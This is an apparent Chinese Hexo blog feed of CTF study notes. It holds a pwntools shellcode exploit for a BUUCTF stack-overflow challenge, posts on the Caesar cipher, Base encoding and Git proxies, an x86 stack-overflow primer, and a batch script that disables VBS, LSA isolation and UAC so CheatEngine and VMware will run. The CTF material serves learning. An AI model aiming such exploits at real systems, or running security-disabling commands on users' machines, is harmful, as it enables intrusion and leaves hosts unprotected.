class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;b0verfl0w&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28176</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode_len = <span class="built_in">len</span>(shellcode) <span class="comment"># shellcode_len = 23</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode_len)</span><br><span class="line"></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&#x27;sub esp,0x28;jmp esp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#    0:   83 ec 28                sub    $0x28,%esp</span></span><br><span class="line"><span class="comment">#    3:   ff e4                   jmp    *%esp</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">sub_len = <span class="built_in">len</span>(sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">payload = shellcode   <span class="comment">#往栈上写shellcode</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#补填字节到溢出点 溢出点 = 36 应该是补填了 36-23 = 13</span></span><br><span class="line">payload += (<span class="number">0x24</span>-shellcode_len) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#根据 ret的特性 首先是先jmp esp 之后 add esp,4 我们可以让他先执行完 add esp,4 然后进行jmp esp</span></span><br><span class="line">payload += p32(jmp_esp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#跳回栈顶</span></span><br><span class="line">payload += sub_esp_jmp</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PWN-shellcode&quot;&gt;&lt;a href=&quot;#PWN-shellcode&quot; class=&quot;headerlink&quot; title=&quot;PWN-shellcode&quot;&gt;&lt;/a&gt;PWN-shellcode&lt;/h1&gt;&lt;p&gt;在开始之前呢首先我们先了解一下编译器开启的一些保护措施&lt;/p&gt;
&lt;h1 id=&quot;一、PIE&quot;&gt;&lt;a href=&quot;#一、PIE&quot; class=&quot;headerlink&quot; title=&quot;一、PIE&quot;&gt;&lt;/a&gt;一、PIE&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;PIE（Position Independent Executable）&lt;/strong&gt; 是现代操作系统中用于提升安全性的一个关键机制。它允许可执行文件在运行时被加载到内存中的任意地址，而不是一个固定的地址，从而配合 &lt;strong&gt;ASLR（Address Space Layout Randomization）&lt;/strong&gt; 进行地址空间的随机化，防止攻击者预测代码地址。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>凯撒密码解析</title>
    <link href="http://example.com/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2025-06-03T05:40:06.000Z</published>
    <updated>2025-06-06T04:53:42.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h1><p>把明文中所有字母都在字母表上向后或者向前按照一个固定数目进行偏移后被替换成密文</p><span id="more"></span><p><img src="/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/image-20250603134504695.png" alt="image-20250603134504695"></p><h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p><img src="/2025/06/03/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90/image-20250603134538679.png" alt="image-20250603134538679"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;加密方法&quot;&gt;&lt;a href=&quot;#加密方法&quot; class=&quot;headerlink&quot; title=&quot;加密方法&quot;&gt;&lt;/a&gt;加密方法&lt;/h1&gt;&lt;p&gt;把明文中所有字母都在字母表上向后或者向前按照一个固定数目进行偏移后被替换成密文&lt;/p&gt;</summary>
    
    
    
    
    <category term="凯撒密码" scheme="http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>BASE编码解析</title>
    <link href="http://example.com/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2025-06-03T05:17:26.000Z</published>
    <updated>2025-06-03T05:44:49.114Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BASE系列编码"><a href="#BASE系列编码" class="headerlink" title="BASE系列编码"></a>BASE系列编码</h1><ol><li>先将待编码字符按照ASCII编码转换成8bit二进制形式</li><li>再将二进制序列切片组合，重组为若干个等长的二进制组</li><li>将每个二进制组转换成十进制数字，并查表找到对应的可打印ASCII字符</li><li>重组若不足则补0 并将其编码为‘&#x3D;’</li></ol><span id="more"></span><p>根据分组长度的不同 (4bit、5bit、6bit) 可以分为三种BASE编码形式</p><ul><li>4bit base16编码 字母表为 0123456789ABCDEF</li><li>5bit base32编码 字母表为 A-Z 2-7</li><li>6bit base64编码 字母表为 A-Z a-z 0-9 +&#x2F;</li></ul><p>示例如下所示</p><p><img src="/2025/06/03/BASE%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90/image-20250603133012939.png" alt="image-20250603133012939"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;BASE系列编码&quot;&gt;&lt;a href=&quot;#BASE系列编码&quot; class=&quot;headerlink&quot; title=&quot;BASE系列编码&quot;&gt;&lt;/a&gt;BASE系列编码&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;先将待编码字符按照ASCII编码转换成8bit二进制形式&lt;/li&gt;
&lt;li&gt;再将二进制序列切片组合，重组为若干个等长的二进制组&lt;/li&gt;
&lt;li&gt;将每个二进制组转换成十进制数字，并查表找到对应的可打印ASCII字符&lt;/li&gt;
&lt;li&gt;重组若不足则补0 并将其编码为‘&amp;#x3D;’&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
    <category term="编码" scheme="http://example.com/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>git设置代理</title>
    <link href="http://example.com/2025/05/31/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <id>http://example.com/2025/05/31/git%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
    <published>2025-05-31T12:30:17.000Z</published>
    <updated>2025-05-31T12:34:15.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="临时设置"><a href="#临时设置" class="headerlink" title="临时设置"></a>临时设置</h1><p>打开 Git Bash，使用命令临时设定socks代理:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:socks5端口号&#x27;</span></span><br><span class="line"> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:socks5端口号&#x27;</span></span><br></pre></td></tr></table></figure><span id="more"></span><p>或者http代理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;http://127.0.0.1:http端口号&#x27;</span></span><br><span class="line"> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;https://127.0.0.1:https端口号&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="永久设置"><a href="#永久设置" class="headerlink" title="永久设置"></a>永久设置</h1><p>若想要设置代理永久生效，则可以把它写入 .gitconfig 文件中。</p><p>使用 vi 打开 .gitconfig 文件：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.gitconfig</span><br></pre></td></tr></table></figure><p>写入下列配置(建议在最末写入)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[http]</span><br><span class="line"> </span><br><span class="line">proxy = socks5:<span class="comment">//127.0.0.1:socks5端口号</span></span><br><span class="line">proxy = http:<span class="comment">//127.0.0.1:http端口号</span></span><br><span class="line"> </span><br><span class="line">[https]</span><br><span class="line"> </span><br><span class="line">proxy = socks5:<span class="comment">//127.0.0.1:socks5端口号</span></span><br><span class="line">proxy = https:<span class="comment">//127.0.0.1:http端口号</span></span><br></pre></td></tr></table></figure><p>修改后重启 git ，使配置生效：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -l --global</span><br></pre></td></tr></table></figure><p>查看当前代理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config -l</span><br></pre></td></tr></table></figure><p>可以看到自己所配置的端口信息，则说明配置成功。</p><p>原文链接：<a href="https://blog.csdn.net/m0_57567093/article/details/127455214">https://blog.csdn.net/m0_57567093/article/details/127455214</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;临时设置&quot;&gt;&lt;a href=&quot;#临时设置&quot; class=&quot;headerlink&quot; title=&quot;临时设置&quot;&gt;&lt;/a&gt;临时设置&lt;/h1&gt;&lt;p&gt;打开 Git Bash，使用命令临时设定socks代理:&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git config --global http.proxy &lt;span class=&quot;string&quot;&gt;&amp;#x27;socks5://127.0.0.1:socks5端口号&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git config --global https.proxy &lt;span class=&quot;string&quot;&gt;&amp;#x27;socks5://127.0.0.1:socks5端口号&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>关于CheatEngine提示DBVM无法启动以及VMware提示此平台不支持虚拟化的解决方案</title>
    <link href="http://example.com/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://example.com/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2025-05-31T12:19:17.000Z</published>
    <updated>2025-05-31T12:51:02.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>windows11 24h2 其它系统应该是通用</li></ul><h1 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h1><ol><li><p>首先打开控制面板-程序-启动或关闭Windows功能 像这样关闭这些:</p><p><img src="/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202152090.png" alt="image-20250531202152090"></p></li><li><p>然后再找到服务禁用以下功能</p></li></ol><span id="more"></span><p>   <img src="/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202227080.png" alt="image-20250531202227080"></p><ol start="3"><li><p>之后再设置里面搜索内核隔离然后把内核隔离的所有选项关闭</p><p><img src="/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202419509.png" alt="image-20250531202419509"></p></li><li><p>重启电脑尝试即可 若还是不行请看<strong>步骤2</strong></p></li></ol><h1 id="步骤2-来自-VMware-Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel-VT-x-EPT”的报错问题-VM技术库"><a href="#步骤2-来自-VMware-Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel-VT-x-EPT”的报错问题-VM技术库" class="headerlink" title="步骤2 [来自](VMware Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel VT-x&#x2F;EPT”的报错问题 - VM技术库)"></a>步骤2 [来自](<a href="https://vmlib.com/virtualized-intel-vt-ept-not-supported/">VMware Workstation：如何解决打开虚拟机出现“此平台不支持虚拟化的Intel VT-x&#x2F;EPT”的报错问题 - VM技术库</a>)</h1><p>运行<strong>msinfo32.exe</strong>命令，确认Windows 11的宿主机是否开启了VBS，如果”<strong>基于虚拟化的安全</strong>“那一行后面显示是“<strong>未启用</strong>”，本文内容不适合。如果显示“<strong>正在运行</strong>”，请继续第2步。</p><p><img src="/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202602321.png" alt="image-20250531202602321"></p><p>之后执行以下脚本 写出一个bat文件即可 记得要管理员运行</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">dism /Online /Disable-Feature:microsoft-hyper-v-all /NoRestart</span><br><span class="line">dism /Online /Disable-Feature:IsolatedUserMode /NoRestart</span><br><span class="line">dism /Online /Disable-Feature:Microsoft-Hyper-V-Hypervisor /NoRestart</span><br><span class="line">dism /Online /Disable-Feature:Microsoft-Hyper-V-Online /NoRestart</span><br><span class="line">dism /Online /Disable-Feature:HypervisorPlatform /NoRestart</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM ===========================================</span></span><br><span class="line"></span><br><span class="line">mountvol X: /s</span><br><span class="line"><span class="built_in">copy</span> <span class="variable">%WINDIR%</span>\System32\SecConfig.efi X:\EFI\Microsoft\Boot\SecConfig.efi /Y</span><br><span class="line">bcdedit /create &#123;<span class="number">0</span>cb3b571-<span class="number">2</span>f2e-<span class="number">4343</span>-a879-d86a476d7215&#125; /d &quot;DebugTool&quot; /application osloader</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571-<span class="number">2</span>f2e-<span class="number">4343</span>-a879-d86a476d7215&#125; <span class="built_in">path</span> &quot;\EFI\Microsoft\Boot\SecConfig.efi&quot;</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;bootmgr&#125; bootsequence &#123;<span class="number">0</span>cb3b571-<span class="number">2</span>f2e-<span class="number">4343</span>-a879-d86a476d7215&#125;</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571-<span class="number">2</span>f2e-<span class="number">4343</span>-a879-d86a476d7215&#125; loadoptions DISABLE-LSA-ISO,DISABLE-VBS</span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;<span class="number">0</span>cb3b571-<span class="number">2</span>f2e-<span class="number">4343</span>-a879-d86a476d7215&#125; device partition=X:</span><br><span class="line">mountvol X: /d</span><br><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br><span class="line">REG DELETE HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity /f</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 关闭UAC通知</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /f /v &quot;EnableLUA&quot; /t REG_DWORD /d <span class="number">0</span></span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Security Center&quot; /f /v &quot;UacDisableNotify&quot; /t REG_DWORD /d <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> 接下来！重新启动您的电脑！完成剩下的操作。</span><br><span class="line"><span class="built_in">echo</span> 请注意！重启时的屏幕提示！</span><br><span class="line"><span class="built_in">echo</span> 请重启！过了BIos自检之后！看到黑白字符提示你按键的时候</span><br><span class="line"><span class="built_in">echo</span> 请死按，狂按 F3键，自动重启为止！!</span><br><span class="line"><span class="built_in">echo</span> 可以关闭此窗口了，重启电脑吧。。。</span><br><span class="line"><span class="built_in">pause</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br></pre></td></tr></table></figure><p>这样就是成功了 亲测有效 脚本没问题 本人也是被这个问题困扰了很久很久</p><p><img src="/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202740359.png" alt="image-20250531202740359"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;windows11 24h2 其它系统应该是通用&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;步骤1&quot;&gt;&lt;a href=&quot;#步骤1&quot; class=&quot;headerlink&quot; title=&quot;步骤1&quot;&gt;&lt;/a&gt;步骤1&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;首先打开控制面板-程序-启动或关闭Windows功能 像这样关闭这些:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/05/31/%E5%85%B3%E4%BA%8ECheatEngine%E6%8F%90%E7%A4%BADBVM%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BB%A5%E5%8F%8AVMware%E6%8F%90%E7%A4%BA%E6%AD%A4%E5%B9%B3%E5%8F%B0%E4%B8%8D%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20250531202152090.png&quot; alt=&quot;image-20250531202152090&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;然后再找到服务禁用以下功能&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN-简单栈溢出</title>
    <link href="http://example.com/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2025-05-30T06:58:02.000Z</published>
    <updated>2025-06-06T04:58:05.208Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-简单栈溢出"><a href="#PWN-简单栈溢出" class="headerlink" title="PWN-简单栈溢出"></a>PWN-简单栈溢出</h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>pwn这门课程简单来说就是通过二进制的形式去找到某台服务器存在哪些漏洞 与web不同的是他大部分的知识都是基于汇编组成的 在 <a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF-Wiki</a> 里面的介绍则是这样的:</p><blockquote><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p><ul><li>程序必须向栈上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul></blockquote><span id="more"></span><p>则 栈的介绍如下：</p><h2 id="基本栈介绍-¶"><a href="#基本栈介绍-¶" class="headerlink" title="基本栈介绍 ¶"></a>基本栈介绍 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/#_2">¶</a></h2><blockquote><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530150427160.png" alt="image-20250530150427160"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p></blockquote><p>这些是简单的栈介绍</p><p>首先 栈是一种特殊的数据结构 他存储了 function runtime 的参数、变量和返回地址他在一次函数调用中是不可或缺的重要部分，其中软件的架构又分为两种</p><p><code>x86</code> 和 <code>x64 </code></p><p>这两种在参数和变量的在栈存储形式上有些不同 例如</p><p><code>x86</code> 的所有参数通过 <strong>栈</strong> 从右到左依次压入 可用以下代码作为示例 使用 <code>visual stdio</code> 编译 x86 版本观查栈</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> _param1, <span class="type">int</span> _param2, <span class="type">int</span> _param3, <span class="type">int</span> _param4, <span class="type">int</span> _param5)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> _param1 + _param2 + _param3 + _param4 + _param5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">func</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;helloworld\n&quot;</span>;</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530151556007.png" alt="image-20250530151556007"></p><p>如图所示 我们定位到了 <code>main</code> 函数 然后我们在 <code>func </code> 处下断点 我们让他继续执行到<code>func</code> 执行到 <code>call</code>的时候我们观察栈的变化</p><p><img src="/2025/05/30/PWN-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250530151756664.png" alt="image-20250530151756664"></p><p>如图所示 这是一个从低地址到高地址的显示方式 但是在入栈的时候 他是 <strong>从高地址到低地址从右往左参数依次入栈</strong></p><p>然后我们进入call继续查看 进入call的同时我们发现 他先是压入了一个地址 这个地址就是 call 所在地址 + 5 的字节</p><p>所以<code>call xxxxxxxx</code>就等效于 <code>push eip + 5</code> call的机器码占用一个字节 然而地址占用4个字节 其次又跳转到了 后面的地址处 所以call指令做了两件事 先是压入一个返回地址 接着又是进行了一次 <code>jmp</code> 跳转 然后我们接着看</p><p>在跳转过来的函数头部我们发现了两条指令 <code>push ebp</code> <code>mov ebp esp</code> 那么这是什么意思呢？</p><p>其实是 <code>典型的 x86 函数栈帧初始化</code> </p><p>首先将当前的 <code>ebp</code> 寄存器的值压入栈 也就是保存上个函数的栈底地址 <code>(push ebp)</code></p><p>之后把上个函数的栈顶作为当前函数的栈底 <code>(mov ebp esp)</code></p><p>之后就是进行一系类的加法操作 到了 <code>pop ebp</code>的时候 就要销毁此栈帧恢复上一个函数的栈帧了</p><p>然而我们可以发现 函数参数是通过 <code>ebp + n*4</code> 的方式进行访问的 这很关键</p><p>直到执行到 <code>ret</code> 我们会发现 他的效果就等于 <code>jmp esp &amp; add esp,4</code>   为什么这么说 我们接着分析栈</p><p><img 